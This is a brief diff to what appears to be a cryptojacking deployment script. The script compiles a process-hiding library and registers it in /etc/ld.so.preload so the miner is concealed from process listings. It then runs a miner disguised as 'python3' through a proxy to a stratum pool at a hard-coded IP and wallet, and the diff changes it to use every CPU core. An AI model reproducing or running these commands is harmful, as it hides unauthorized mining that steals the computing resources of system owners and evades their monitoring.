@@ -42,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1qfzgk7ukgrdewp0q370tty9r0rp9cgkzew339lw.rk -p x -t16
+./graftcp/graftcp ./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1qfzgk7ukgrdewp0q370tty9r0rp9cgkzew339lw.rk -p x -t$(nproc --all)
